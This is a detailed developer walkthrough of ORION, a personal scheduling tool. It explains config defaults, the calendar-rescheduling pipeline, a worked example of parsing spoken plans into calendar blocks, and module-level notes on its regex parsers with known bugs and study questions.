**Calendar and Reminders (not files):** all calendar and reminder I/O goes through `bridgeRequest(action, payload)` (`bridge-path.mjs:36-46`), which shells out to the Mac bridge binary: `~/.openclaw/orion-remote/bin/orion-mac-bridge`, falling back to `~/Desktop/ORION/native/OrionMacBridge/.build/release/orion-mac-bridge` (`:18-20`), or `ORION_BRIDGE_BIN` (tests), or the sandbox bridge `scripts/lib/eval/sandbox-bridge.mjs` in eval mode. Actions used by this folder: `list_upcoming_calendar_events {from:"today"}` (`live-day.mjs:62`), `create_calendar_event {title,start,end,orionKind?}`, `move_calendar_event {identifier,start,end}`, `delete_calendar_event {identifier}` (`calendar-write.mjs`), `list_incomplete_reminders`, `move_reminder {identifier,list}`, `complete_reminder {identifier}` (`todo-lists.mjs:36-40`). The CLIs additionally use `list_deadlines`.

---

### 2.6 Config keys and defaults (`config.mjs`)

`DEFAULTS` is `Object.freeze`d at `config.mjs:11-36`. `loadConfig()` returns `{ ...DEFAULTS, ...file }` and **silently returns pure defaults on any read/parse error** (`:44-46`). The file is shallow-merged, so a stored `minimums`/`ranks` object replaces the default one entirely.

| Key | Default | Validator (in `VALIDATORS`, `:48-68`) | Used by | Effect |
|---|---|---|---|---|
| `sideProjectMinutes` | 60 | int 0..300 | fill-day, daily-needs | Daily side-project hour asked for |
| `sideProjectLabel` | "Side project (YouTube)" | string 1..60 | fill-day, morning-brief | Title of the block |
| `gymDays` | `[1,3,5]` | array of ints 1..7 (ISO, Mon=1) | fill-day, daily-needs | Which weekdays ask for gym |
| `gymMinutes` | 60 | int 15..180 | fill-day | |
| `bedtime` | "00:00" | `HH:MM` | night.bedOn | Target asleep-by |
| `usualWake` | "09:00" | `HH:MM` | night.wakeOn, orion-reschedule | Wake when nothing earlier is fixed |
| `sleepHours` | 8 | number 5..11 | night.bedOn | Sleep need (wake - this = latest bed) |
| `studyMinutes` | 60 | int 15..240 | fill-day | Study ask when no ramp |
| `dinner` | true | boolean | fill-day | Add a Dinner ask |
| `windDownMinutes` | 30 | int 0..90 | fill-day | Wind-down block just before bed |
| `freeMinutesKept` | 60 | int 0..240 | fill-day, replan `keepFree` | Genuinely free minutes left in the day |
| `commuteMinutes` | 30 | int 0..180 | commute, night.bedOn, early | One-way trip. **Live file overrides to 45** |
| `homeGapMinutes` | 150 | int 60..600 | commute | Gap between classes at least this long means he goes home |
| `ranks` | `{}` | (only via `setRank`) | priority.rankOf | His priority words, e.g. `{gym:"high"}` |
| `readyMinutes` | 105 | int 15..180 | night.wakeOn | Wake = first commitment - this (7:15 for 9:00) |
| `bufferMinutes` | 10 | int 0..30 | replan, early, freed-time | Gap between planned blocks. **Live file overrides to 5** (`plugin/workspace/SCHEDULING.md:116` says bufferMinutes=5) |
| `ignoreTitles` | `["(optional)"]` | array<=50 of strings 3..80 chars | `ignoredEvent`, `live-day.calendarEvents` | Case-insensitive substrings; matching events are treated as non-existent |
| `todoList` | "Orion" | string 1..60 | todo-lists, orion-tasks | The one Reminders list ORION plans from |
| `sweepLists` | `["Reminders"]` | array<=10 strings | todo-lists | Lists whose reminders are moved onto `todoList` |
| `minimums` | `{}` | (only via `setMinimum`) | lengths, freed-time, after-late-night | `{ "nap": 75 }`: least minutes for any title containing the key |
| `autoShrink` | true | boolean | orion-reschedule | When the day overflows, low-priority blocks shrink before any is dropped |

Setters: `setConfig(key, raw)` (`:86-99`) validates, coerces (number/boolean/comma list via the type of the default), merges into the existing file and writes atomically; unknown key throws `unknown setting`. `setMinimum(key, minutes)` (`:71-84`) accepts names matching `/^[a-z0-9][a-z0-9 '-]{1,39}$/`, minutes 0..600, and 0 deletes. `setRank(key, rank)` (`:104-115`) accepts `high|medium|low|none`. These back the subcommands of `scripts/orion-life` (`orion-life` with no args shows the config, `set <key> <value>`, `min <name> <minutes>`, `rank <name> high|medium|low|none`; `scripts/orion-life:2-7`). Quirk: `bufferMinutes` has an orphaned comment fused on the same line at `:23` ("// up before his first commitment: 7:15 for a 9:00 class") that belongs to `readyMinutes`; harmless but confusing.

`toMinute("09:30")` (`:101`) is the only parser of `HH:MM`; it does no validation.

---

### 2.7 How the modules compose into the day-planning pipeline

There is **no single "pipeline" function.** The composition happens in the CLIs, mainly `scripts/orion-reschedule`, which calls the modules in a fixed order. I verified the order below by reading the imports and call sites (line numbers are `scripts/orion-reschedule`).

**Stage 0: arguments and refusal rules** (`:67-115`). One command per call, only its own options, unknown flags refused ("NOTHING WAS CHANGED: ..."). Born from 2026-10-06 and 2026-10-07 incidents where the model sent two commands glued together and only one ran.

**Stage 1: parse what he said** (`:183`, `:197-199`, `:598-604`).
`plan-parse.parsePlans(sayText, now)` turns `--say "gym at 5, dinner with friends at 7:30, study for macro for 90 min"` into dated items `{title, kind, date, start, minutes, fixed, importance, assumed[]}`. Items whose date differs from the target date are reported as `NOT BOOKED: ... run again with --date` rather than silently dropped (`:199`, `:986`). For `day --todos`, `todo-parse.parseTodos` estimates minutes/optional/due per Reminders item (`:577`). For `orion-tasks`, `task-notes.parseTaskNotes` + `task-spread.parseSpread` read how a to-do is to be spread, and `planSessions` turns that into minutes per date (`orion-tasks:84-138`).

**Stage 2: priority / deadline ramp** (`:204-211`, `:621`, `:952`). `deadline-ramp.ramp(deadlines, {today})` computes how many study minutes today's share of each upcoming quiz/exam is; `studyPlanFor` keeps only assessment-looking titles (a past dry run produced "Study for Halloween" from a holiday feed, comment at `:201-203`). `task-spread.taskImportance` and `priority.importanceOf` produce the 0/1/2 importance (must/normal/optional) that `replan` uses to decide what is left out when time runs out.

**Stage 3: read the real day** (`:213-216`). `history.loadPatterns` (median wake if 3+ samples), `live-day.calendarEvents` (bridge `list_upcoming_calendar_events`, minus `ignoreTitles` and skipped occurrences), `live-day.toBlocks` (events to blocks), `pins.pinBlocks` (promote Nick-placed ORION blocks to fixed). Then `night.bedOn` + `readWakeRequest` give the day's end (`asleepBy`, `:227`); the planning window becomes `{start: max(wake-60, 360), end: min(1440, asleepBy, --until)}` (`:232`).

**Stage 4: sensible times and walls** (`:259`, `:328-334`, `:902-904`). `sensible-time.homeFrom` (when he is home: last real class end + commute, else wake) and `preferredStart` (nap at home time, lunch >=12:00, dinner >=18:30, gym >=17:00, evening activities >=20:00) set `after`/`prefer` on untimed items. `commute.commuteWalls` produces "soft" walls (travel before first class, after last class, between classes with a gap >= `homeGapMinutes`, around social plans) that flexible work avoids but a time Nick states may overlap.

**Stage 5: the placement engine** (`:913`, `:926`, `:934`; rebuild and shrink `:917-940`). `replan(blocks, {now, window, blocked, soft, add, rebuild, buffer, keepFree})` (see 2.9) uses `gaps.freeGaps` and `priority.importanceOf/priorityOf`. If something is unplaced and `autoShrink` is on, `lengths.shrinkPlan` + `applyShrink` shorten low-priority blocks (rest, side project, "optional") and `replan` runs a second time; the second result is kept only if it leaves fewer unplaced (`:935`). `lengths.withMinimums` first raises any new item to his minimum (nap 75) (`:796`).

**Stage 6: fill** (`:621`, `:944-954`). `fill-day.fillDay(blocks, {now, window, weekday, config, deadlines, studyPlan})` proposes study (from the ramp), gym on gym days, side-project remainder, dinner, a break, wind-down, in that order, while keeping `freeMinutesKept` free. Those asks go through `replan` once more with every existing block turned `fixed` and re-id'd `kept-<id>` so the fill can never move anything.

**Stage 7: early / late / freed time** (separate commands in the same CLI). `late`/`busy`/`overrun`/`now` build `add`/`blocked` lists and run Stage 5. `early` (`:638-728`) uses `early.earlyContext` (what just ended?) and `early.finishEarly` (pull the rest of the day forward), then `freed-time.breakFor` / `shortBlock` / `extendWithin` to use the freed minutes (a 15-minute break after an hour of work, then extend a block that is short of its minimum or the daily side-project hour).

**Stage 8: check, write, verify** (`:136-146`, `:979-984`). `projectDay` builds the day as it will be; `day-check.checkDay` refuses the whole change if any ORION-placed block overlaps anything or is under 5 minutes (`refuseIfBroken`). Only then `calendar-write.applyPlan` writes through the bridge in order delete -> move -> create, journaling each step for undo; any failure triggers `reverseSteps` (rollback). `verifyWritten` re-reads the calendar through `toBlocks` and runs `checkDay` again on what was really stored. Pin ids for blocks he timed (`pinCreated`) are saved by `savePins`.

**Around the pipeline (periodic and conversational):**

| Trigger | CLI | Modules used | What happens |
|---|---|---|---|
| Every watch tick (run by the ORION Mac app about every 5 minutes, per the `orion-watch` header `:3`) | `orion-watch` | live-day, todo-lists.sweep, night, after-late-night, morning-brief, class-reminders, history.summarize | Sweeps Reminders onto the Orion list (`:66`); spawns `orion-tasks sweep` every tick (`:141`) and `orion-tasks plan` once a morning (`:148-153`); reshapes the day after a short night once (`:116-134`); writes `night.json`; sends class reminders (10 min before); composes the morning brief (`:164`); `summarize(log)` refreshes `patterns.json` (`:197`) |
| Model says "I'm starting X / I'm done" | `orion-checkin` | follow-through, deferral, history | Per-block loop `waiting -> reminded -> intervening -> active -> done`; excuses classified; outcomes appended to `life-history.jsonl` |
| Status read | `orion-now`, `orion-next` | sleep-state, bedtime, next-action, daily-needs, history | Read-only "what now" |
| "Study for macro 2 hours this week" | `orion-plan-study` | study-request, fit-study, applyPlan | Parse, find real slots across up to 14 days, `--book` writes them |
| Phone side | Swift `NightMarkers.swift`, `ScreenWatch.swift`, `TaskNotes.swift` | mirror `night.mjs`, `distraction.mjs`, `task-notes.mjs` | Same rules reimplemented; comments in those Swift files point at the `.mjs` as the reference |

**What is NOT in this pipeline (despite the names in your original sketch):** `weekly`, `day-review`, `grant-policy`, `distraction`, `sync-*` and `block` are not called by any executable. There is no "weekly review" or "night report" CLI built on them at HEAD. "Night" in this folder means the wake/bed markers (`night.mjs`), not a nightly review; `day-review.reviewDay` produces the "Today: 3 of 5 planned blocks done" sentence but nothing calls it. (If a later commit wires them, they will show in `grep -rn "lib/life/day-review" scripts`.)

---

### 2.8 Worked example: one realistic request flowing through

I ran the real pure functions with `node` (no calendar, no network, no files written; the scratch scripts are in the session scratchpad, not the repo) and report the actual output. Scenario: **Wednesday 2026-10-14, 11:40 AM** (`now.minute = 700`; for the parser `minute = 630`, 10:30, which matters, see the gotchas). His calendar: ECON1115 lecture 10:00-11:30 (a real class, fixed); an ORION "Study" 13:00-14:00 and "Gym" 15:00-16:00 (ORION-booked, movable); "Dinner with friends" 19:30-21:00 (fixed). He has a MKTG2201 quiz next Tuesday.

**Step 1: what he says is parsed (`plan-parse.parsePlans`, called by `orion-reschedule day --say`).**
Input: `"gym at 5, then dinner with friends at 7:30, and study for macro for 90 minutes"`, `now = {date:"2026-10-14", minute:630, weekday:3}`. Output (trimmed to the fields that matter):

```
Gym                 kind gym     start 1020 (17:00)  minutes 60   fixed false  assumed ["60 min"]
Dinner with friends kind social  start 1170 (19:30)  minutes 120  fixed true   assumed ["120 min"]
Study for macro     kind study   start null          minutes 90   fixed false  assumed []
```

"5" became 17:00 (hours 1-6 are PM, `plan-parse.mjs:166`); "7:30" became 19:30 because `kind === "social"` (`:169`); "with friends" made dinner `social` and therefore `fixed`; the gym got the default 60 min and says so in `assumed`; the study got its 90 from the text. Only `social` and `class` kinds are ever `fixed` (`:381`); a timed gym is "pinned", not a wall.

**Step 2: a to-do list sentence (`todo-parse.parseTodos`).** `"add finish resume and email professor by friday, maybe laundry"` gives:

```
finish resume   minutes 90  optional false due null
email professor minutes 30  optional false due 2026-10-16   (by friday = next Friday, strictly after today)
laundry         minutes 45  optional true  due null          ("maybe" strips and flags optional)
```
Minutes come from `KEYWORD_MINUTES` (resume = 90, email = 30, laundry = 45).

**Step 3: spread a to-do across days (`task-spread`).** Note on a Reminders item: `2 hours a day until it's due`, due Saturday 2026-10-17:
`parseSpread` -> `{kind:"daily", minutes:120}`; `planSessions(..., {today:"2026-10-14", due:"2026-10-17"})` -> sessions on 10-14, 10-15, 10-16 (120 each; the due date itself is excluded: `lastWorkDay = due - 1`). A different note, `"two 2-hour blocks, Tuesday and Thursday"`, due 10-21, gives `[{2026-10-15, 120}, {2026-10-20, 120}]` (the nearest Thursday and Tuesday). `taskImportance({priority:"medium", due:"2026-10-15"}, "2026-10-14")` -> `0` (must), because due tomorrow counts as "close" (`task-spread.mjs:109-114`).

**Step 4: study ramp for the quiz (`deadline-ramp.ramp`).** `ramp([{id:"q1", title:"MKTG2201 quiz", date:"2026-10-20"}], {today:"2026-10-14"})` gives a rising load over the 5 days before the quiz (`NEEDS.quiz` = 240 minutes, `WINDOW.quiz` = 5 days, so 10-15 to 10-19):

```
10-15  30 min    10-16  30 min    10-17  45 min    10-18  60 min    10-19  75 min   (sum 240)
reason: "quiz on Tuesday 20 October — 240 min left"
```

**Step 5: travel walls (`commute.commuteWalls`, default commute 30).** With the lecture and the "Dinner with friends" block (social so he has to travel):
`commute home 11:30-12:00`, `commute to class 09:30-10:00`, `getting to Dinner with friends 19:00-19:30`, `getting back 21:00-21:30`. (Live config sets `commuteMinutes` 45; I used the default.) These become `soft` walls for `replan`.

**Step 6: the placement engine (`replan`).** Input: the 4 blocks above, `now = 700`, window 09:00-23:00 (`{start:540,end:1380}`), `soft = commuteWalls(...)`, `buffer = 10`, `keepFree = 60`, and two asks: `Finish resume, 90 min, importance 0 (must)`, and `Nap, 45 min, pinned at 13:00`. Output:

```
Nap            13:00-13:45  (new, pinned: his stated time, kept exactly)
Gym            15:00-16:00  (stayed: it does not conflict with the nap + 10 min buffer)
Study          16:10-17:10  MOVED from 13:00 (the nap took its slot; first gap long enough after the buffer was after the gym)
Finish resume  17:20-18:50  (new, must-have; leaves the 19:00 travel wall alone)
Dinner w/ friends 19:30-21:00 (wall)
unplaced: []   shifted: []
```
Why the study landed at 16:10: it wants to start at or after 13:00; gaps are computed with the nap (13:00-13:45) and gym (15:00-16:00) padded by 10 minutes each, leaving 13:55-14:50 (55 min, too short for 60) before the gym, so the first fit is 16:10 (`replan.mjs:24-29`, `slot`).

**Step 7: the day check and the write.** `checkDay` on the projected day finds no overlaps and no block under 5 minutes, so `applyPlan` runs: `move_calendar_event` for Study, `create_calendar_event` for Nap and Finish resume (both with `orionKind`), one journal entry in `reschedule-undo.json`, and pins saved for the nap (a time he stated).

**Step 8: later he says he finished the study block early.** `finishEarly(blocks, {now: 810 (13:30), mode:"block", commuteMinutes:30, buffer:5})` on the original day: the block under way (Study 13:00-14:00) is shortened to end at 13:30 (`shortened {from:840,to:810}`), and the next movable block, Gym 15:00, is pulled forward to 13:35 (`moves [{id:"g1", from:900, to:815}]`): `cursor = freeFrom + buffer = 815`. Nothing moves later, ever.

**Step 9: weeks later, `orion-patterns`.** Three started check-ins at +20, +25, +30 minutes late -> `lateness(...).sentence` = `"You usually start about 25 min late."`.

**Step 10: a phone-lock request (not wired to a CLI at HEAD).** `decideGrant({now:{minute:60}, asked:30, reason:"need to message my group", lock:{why:"night", untilMinute:420}, firstCommitment:540, grantsTonight:0})` -> `{grant:20, say:"Unlocked for 20 min — 1:20 AM. Then it locks again. (asked for 30; 20 is what I'll do.)"}`.

---

### 2.9 The important modules (full template)

#### 2.9.1 `config.mjs`: standing preferences

- **What it is.** One small JSON file of Nick's planning preferences (`life-config.json`) with defaults, validators and three setters. Nick changes it in conversation ("make my side-project hour about the London vlog", "naps are at least 75 minutes always") and the model runs `orion-life ...`. It also owns `ignoredEvent` (events he never goes to) and the `toMinute` helper.
- **Where.** `scripts/lib/life/config.mjs`: `CONFIG_FILE` `:9-10`; `DEFAULTS` `:11-36`; `ignoredEvent` `:39-42`; `loadConfig` `:44-46`; `VALIDATORS` `:48-68`; `setMinimum` `:71-84`; `setConfig` `:86-99`; `toMinute` `:101`; `setRank` `:104-115`.
- **How it works.**
  1. `loadConfig()` does `{ ...DEFAULTS, ...JSON.parse(file) }` inside try/catch. A missing or corrupt file means defaults, silently.
  2. `setConfig(key, raw)` refuses unknown keys, then coerces `raw` by the **type of the default** (number -> `Number(raw)`, boolean -> `raw === true || raw === "true"`, array -> comma-split numbers; that array rule is only right for `gymDays`, which is why `ignoreTitles`/`sweepLists` (string arrays) cannot be set through `orion-life set`: they would become `NaN` and fail validation), validates, reads the current file, merges `{[key]: value}`, writes `file.tmp` and renames.
  3. `ignoredEvent(title, config)` lower-cases and does `includes` per pattern (`:39-42`). `live-day.calendarEvents` filters with it (`live-day.mjs:63`), so an event whose title contains "(optional)" never exists as far as ORION is concerned.
- **Contracts.** Inputs/outputs in 2.6. Env: `ORION_LIFE_CONFIG` (tests/eval) overrides the path. In sandbox mode the file is `eval-life-config.json`.
- **Calls out to.** `bridge-path.sandbox()` (to pick the file name). Nothing else.
- **History.** `37c29fd` 2026-09-30 created (side project, gym, bedtime...); `752ac71` 2026-09-30 "keep his times and order; sensible times for untimed plans" (commute/ready settings, **(inferred)** from the commit title); `35e4889` 2026-10-01 wake/asleep markers; `44c1443` 2026-10-01 `readyMinutes` 105 ("7:15 for a 9:00 class"); `2602593` 2026-10-01 `bufferMinutes` ("things are smooshed"); `3034d64` 2026-10-01 `setMinimum`/`minimums` ("rules he states are saved": Nick had said "naps should be at least an hour and 15 ALWAYS" and ORION replied "Noted" and remembered nothing, `lengths.mjs:3-6`); `295000a` 2026-10-05 `setRank`/`ranks`, `homeGapMinutes`.
- **Gotchas & lessons.**
  - "A prose memory alone is not enforcement": `plugin/workspace/SCHEDULING.md:116` says machine-enforced values live in this file. A preference mentioned in chat but not saved here does not exist for the planner.
  - Code defaults and the live file disagree: default `commuteMinutes` 30 vs live 45, `bufferMinutes` 10 vs live 5. `early.mjs` has its *own* default `commuteMinutes = 45` and `buffer = 5` (`early.mjs:20,78`) independent of `DEFAULTS`.
  - `loadConfig` swallows parse errors: a hand-edit that breaks JSON silently reverts every preference to the default.
  - Minimums and ranks are matched by **substring of the title**, so `rank gym high` also matches "Gymnastics history essay".
  - `sleepHours` validator allows decimals but `setConfig`'s numeric coercion is `Number(raw)`, fine; `bedtime` is a string `"00:00"`, and `night.bedOn` treats a bedtime before noon as after midnight (`night.mjs:29`).
- **Walk it yourself.**
  1. `cat ~/.openclaw/orion-controlled/life-config.json` (the live overrides).
  2. Open `scripts/lib/life/config.mjs:48-68` and compare each validator range to the table in 2.6.
  3. `node --input-type=module -e 'import {DEFAULTS} from "./scripts/lib/life/config.mjs"; console.log(DEFAULTS)'` (read-only; it only reads the eval marker file).
  4. `scripts/orion-life` (25 lines): see how `rank` and `min` re-join the multi-word name.
- **Questions to ask your tutor.**
  1. Why is `loadConfig` a shallow merge and what breaks if `ranks` were partially specified?
  2. Why does `setConfig` coerce by the default's type, and which keys can it not set correctly?
  3. Why are `minimums` and `ranks` separate objects with their own setters instead of going through `setConfig`?
  4. What does the `sandbox()` switch protect against, and where else is it consulted?
  5. If `commuteMinutes` is 45 in the file and 30 in `DEFAULTS`, which modules take it from config and which hard-code their own default?

#### 2.9.2 `plan-parse.mjs`: free text to dated plan items

- **What it is.** A rule-based (regex, no model) parser that turns Nick's sentence ("gym at 5, then dinner with friends at 7:30, study for macro for 90 min") into structured plan items. It exists because the model composing `--plan "title, min, HH:MM, fixed"` lines kept dropping the date and the times: the `--say` flag was added so `orion-reschedule` reads the titles/dates/times/lengths itself (`scripts/orion-reschedule:176-183`, comment dated 2026-09-30).
- **Where.** `scripts/lib/life/plan-parse.mjs` (538 lines). Exports: `DEFAULT_MINUTES` `:3-13`, `parsePlans(text, now)` `:338-341`. Key internals: `splitClauses` `:17-40`; `hasTimeOrActivity` `:42-61`; `parseDate` `:63-107` (only called at `:403`); `resolveBareHour` `:164-181`; `detectKind` `:202-233`; `detectImportance` `:235-239`; `extractTitle` `:241-300`; `hasActivityWords` `:302-320`; label-number shield `:334-336`; `parsePlansShielded` `:343-397`; `extractDateToken` `:399-434`; `extractTimeInfo` `:436-521`; `extractDurationFromClause` `:523-538`.
- **How it works.**
  1. **Shield label numbers** (`:334-341`). Numbers after words like lect/lab/quiz/chapter/ps/hw/room/step are swapped for private-use Unicode characters (U+E010..E019) so no time pattern can match them, and swapped back in titles afterwards. Born from 2026-10-01: "review CS lect 2" was booked at 2 PM and "CS2100 lab 3" at 3 PM.
  2. **Split into clauses** (`splitClauses :17`): split on `, then`, `then`, `and then`, `;`; then split on `, ` but only where the next fragment contains a time or an activity word (else it is appended to the previous clause). A bare `and` is NOT a separator (see gotchas).
  3. **Per clause**: skip it unless `hasActivityWords` (an activity keyword, `with <word>`, or any time pattern at all, `:302-320`); `detectKind`; `extractDateToken`; `extractTimeInfo`; `extractDurationFromClause`; `extractTitle`; skip if the title ended up empty.
  4. **Kind detection order** (`:202-233`): meal + "with" -> social; any social word (with, friends, party, club, drinks, date, meet, soccer/football/team practice) -> social; meal words -> meal; gym words (gym, run, workout, lift) -> gym; study words -> study; errand -> errand; side-project words -> side_project; rest -> rest; class words -> class; unrecognized but "tonight"/"evening" -> social; else `other`.
  5. **Time** (`extractTimeInfo :436`): range `from X till Y` / `X-Y` / `X to Y` first, then `at N`, then `Npm`, `noon`/`midnight`, a bare 1-23, then "after"/"afternoon"/"evening" (start null, `assumed` set). Bare hours go through `resolveBareHour`:

```js
// scripts/lib/life/plan-parse.mjs:164-181
function resolveBareHour(h, kind, clauseLower, now) {
  // 1-6 are PM
  if (h >= 1 && h <= 6) return h + 12;
  // 7-11 are AM unless social/dinner/tonight/evening or passed today
  if (h >= 7 && h <= 11) {
    const isSocialOrDinner = kind === "social" || clauseLower.includes("dinner");
    const isTonightEvening = clauseLower.includes("tonight") || clauseLower.includes("evening");
    const passedToday = now.date && h * 60 <= now.minute;
    if (isSocialOrDinner || isTonightEvening || passedToday) { return h + 12; }
    return h;
  }
  if (h === 12) return 12;
  return h;
}
```
  6. **Minutes**: the time range's length if there was one; else a stated duration (`N minutes`, `an hour`, `N hours`, `an hour and a half` = 90); else `DEFAULT_MINUTES[kind]` and the default is recorded in `assumed` (`class 90, social 120, meal 45, gym 60, study 60, errand 45, side_project 60, rest 30, other 60`).
  7. **fixed** = `kind === "class" || kind === "social"` (`:381`); **importance** 0 for must/have to/need to/important/high priority/cannot drop, 2 for maybe/optional/if there's time/low priority/nice to have, else 1 (`:235-239`).
  8. **Title** (`extractTitle :241-300`): strips joining words, times, dates, durations, bare numbers, importance words, and filler ("I'm going to", "add", "the", "going to"), then sentence-cases.
- **Contracts.** `parsePlans(text: string, now: {date: "YYYY-MM-DD", minute: number, weekday: 0..6 (JS)})` -> `Array<{title, kind, date, start: number|null, minutes, fixed, importance: 0|1|2, assumed: string[]}>`. It throws `TypeError` if `now`, `now.date`, `now.minute` or `now.weekday` is missing (`:344-347`). If `text` is not a string it passes through unshielded.
- **Calls out to.** Nothing (pure). Its only caller is `orion-reschedule` (`:183`), which feeds the items into `add` for the `day` command (`:598-604`), runs `classify(title)` again to get the *calendar* kind, and reports items for other dates as `NOT BOOKED`.
- **History.** `37c29fd` 2026-09-30 first version (Qwen's `tighten-orion/plan-parse` task finished by Claude); `4205b85` 2026-09-30 transactional day replacement; `afe697b` 2026-09-30 rebuild by priority; `936b695` 2026-10-01 "plan from the to-do list one block per to-do" (the 2026-10-01 label-number shield comment at `:330-333` belongs to this period; which of these commits added it I did not diff **(inferred)**).
- **Gotchas & lessons (I verified these by running the function with `now` = Wed 2026-10-14 10:30).**
  - **"Passed today" ignores the target date.** `passedToday` only checks `now.date` is truthy and compares to today's `now.minute` (`:171`), not whether the clause is for tomorrow. `"study tomorrow at 9"` said at 10:30 parses to **21:00** (`start: 1260`). The same applies to `"class at 9 and gym after class"`.
  - **`and` does not split.** `"class at 9 and gym after class"` becomes ONE item `"Class and gym"`, kind gym, 21:00. Only `then`, `;`, and commas-before-activity split clauses.
  - **Substring kind matching:** `"brunch at 11"` is kind `gym` because the gym word `run` is a substring of "brunch" (`:221`, `includes`).
  - **A clause with no activity word is dropped:** `"review CS lect 2 then groceries"` returns only Groceries; "review" is not a keyword (only "revise", "study", ...) and the shielded number removed the time pattern that would otherwise have admitted it.
  - **Dead code:** `parseTime` (`:109`) and `parseDuration` (`:183`) are never called; `extractTimeInfo`/`extractDurationFromClause` replaced them. `import { strict as assert }` at `:1` is unused.
  - **A night out needs the word "tonight".** `"Ministry of Sound from 10 till 2"` with no "tonight" resolves 10 as AM or past; with "tonight" it correctly becomes 22:00 for 240 minutes, kind social, fixed.
  - Weekday numbers are JS (Sunday = 0); `now.weekday` must match.
  - The model is expected to read the `(read from his words: ...)` line the CLI prints (`orion-reschedule:988`) and check the `[assumed ...]` markers: that is the safety net for parser mistakes.
- **Walk it yourself.**
  1. `node --input-type=module -e 'import {parsePlans} from "./scripts/lib/life/plan-parse.mjs"; console.log(parsePlans("gym at 5, then dinner with friends at 7:30", {date:"2026-10-14",minute:630,weekday:3}))'`
  2. Same call with `"study tomorrow at 9"` and compare `start` to 540.
  3. Open `scripts/lib/life/plan-parse.mjs:164-181` and `tests/tighten-plan-parse.test.mjs` (12 tests) and see which of the above behaviours are pinned.
  4. Open `scripts/orion-reschedule:176-199` to see how `--say` interacts with `--date`.
- **Questions to ask your tutor.**
  1. Why shield label numbers with private-use characters rather than writing a smarter time regex?
  2. Explain `resolveBareHour`: why 1-6 PM, 7-11 AM-unless, and what bug does the `passedToday` rule cause for tomorrow's plans?
  3. Why are only `class` and `social` ever `fixed`, and what happens downstream to a timed but not-fixed gym?
  4. Why does the CLI echo `[assumed 60 min]` back to the model?
  5. Which approach would you take to fix "brunch" matching "run" (word boundaries, token matching) and what tests would you add?

#### 2.9.3 `todo-parse.mjs`: a to-do sentence to tasks

- **What it is.** A regex parser that splits "add finish resume and email professor by friday, maybe laundry" into one task per item with an estimated length, optional flag, due date and optional fixed clock time. It is the estimator behind `orion-reschedule day --todos` and `orion-tasks`: Nick wants one block per to-do with a real title, not a model's guess at minutes.
- **Where.** `scripts/lib/life/todo-parse.mjs` (255 lines). Export: `parseTodos(text, {now})` `:170-255`. Internals: wrapper lists `:3-21`; `DURATION_RE` `:23`; `KEYWORD_MINUTES` `:25-32`; `TIME_RE` `:34`; `DUE_RE` `:36-41`; `parseDuration` `:45-54`; `parseTime` `:56-74`; `keywordMinutes` `:76-81`; `processTitle` `:117-134`; `extractDue` `:136-168`.
- **How it works.**
  1. Trim; strip ONE leading wrapper (`can you`, `could you`, `please`, `add`, `put`, `i need to`, `todo:`, `to do:`, `add to my todo list`, `add to my schedule`) and ONE trailing wrapper (` to my todo list`, ` to my schedule`, ` today`, ` please`) (`:179-193`).
  2. Replace ` and `, ` & `, ` then ` with commas and split on `[,\n;•*-]+` (`:197-198`).
  3. For each piece: flag `optional` if it contains maybe / if i have time / if there's time / possibly / probably / try to / ideally, and delete those phrases (`:207-221`); `extractDue` (today, tomorrow, `this <weekday>`, `by <weekday>`; weekday forms mean the next such day strictly after today, except "this <weekday>" when it is today) (`:136-168`); minutes = `parseDuration` else `keywordMinutes` (application/resume/cv/cover letter 90; email/reply/text/call/send 30; study/revise/homework/assignment/problem set/coursework/essay 60; gym/workout/run 60; laundry/clean/tidy/groceries/shop 45; fix/build/code/debug/project 60; else 45), then clamp to 10..240 (`:228-232`); a clock time via `at N[:MM]` (`1..7` without am/pm becomes afternoon, `:70-71`) sets `at` and `fixed: true` (`:235-237`); strip the time phrase; `processTitle` removes joining words and lower-cases the first word unless it is capitalised in the original (proper noun/acronym) (`:117-134`); drop duplicates by lower-cased title (`:246-248`).
- **Contracts.** `parseTodos(text: non-empty string, {now: {date: "YYYY-MM-DD", minute: number}})` -> `{ tasks: [{title, minutes, optional, due: "YYYY-MM-DD"|null, at: minute|null, fixed}], leftover: "" }`. Throws `TypeError` for empty text or missing `now`.
- **Calls out to.** Nothing. Callers: `orion-reschedule:577` (`day --todos`, then `minutesIn(title)` overrides it, `:573-578`) and `orion-tasks:88` (`spreadOf`: a due-dated to-do with no spread gets `{kind:"total", minutes}` from here).
- **History.** `b8c9c5a` 2026-09-30 `agent(todo-parse): To-do parser` (one of Qwen's agent tasks) then `1a741e9` 2026-09-30 "reviewer intervention" (the review system patched it).
- **Gotchas & lessons (verified by running).**
  - **"for N hours" is read as N minutes.** `DURATION_RE` has a third alternative `\bfor\s+(\d+)\b` (`:23`) and the regex engine takes the leftmost match, so `"study for 2 hours"` matches `for 2` first and returns `2`, clamped up to **10 minutes** (`:232`). Same for `"work on cs project for 3"` -> 10. `orion-reschedule` works around it by letting `minutesIn(title)` win (`:573-578`, comment "A length in the to-do itself wins"), but **`orion-tasks:88` does not** (it uses `parsed[0].minutes` directly), so a due-dated to-do titled "study for 2 hours" with no spread plans 10 minutes **(inferred from reading both call sites; I did not run the CLI)**.
  - **Hyphens split items.** `-` is in the delimiter class (`:198`), so `"follow-up email with the TA"` becomes two tasks, `follow` and `up email with the TA`.
  - Unused `import assert` at `:1`. `leftover` is always `""`.
  - "email"/"call"/"text"/"send" -> 30 min beats "study" (first match wins in `KEYWORD_MINUTES` order), so "email the study group" is 30.
  - `DUE_RE.today` strips the word "today" from titles but also treats the trailing wrapper ` today` first, so either form works.
- **Walk it yourself.**
  1. `node --input-type=module -e 'import {parseTodos} from "./scripts/lib/life/todo-parse.mjs"; console.log(JSON.stringify(parseTodos("finish resume and email professor by friday, maybe laundry",{now:{date:"2026-10-14",minute:630}}),null,1))'`
  2. Try `"study for 2 hours"` and look at `minutes`.
  3. Open `scripts/orion-reschedule:553-600` (the `--todos` branch) and see what is filtered before and after `parseTodos`.
  4. Open `tests/truthful-todo-parse.test.mjs` (9 tests) to see what is pinned.
- **Questions to ask your tutor.**
  1. Why does leftmost-match semantics make `for (\d+)` win over `2 hours`, and what is the smallest regex change that fixes it?
  2. Why clamp to 10..240 instead of trusting the parsed number?
  3. How does `fixed: true` from `at 3` flow into `replan` (walls vs pinned), and what does `orion-reschedule` do with `at` for a to-do?
  4. Why are `optional` pieces still returned rather than dropped?
  5. Why does `orion-tasks` need a different estimator path than `day --todos`?

#### 2.9.4 `study-request.mjs`: "two one-hour sessions for macro by friday"

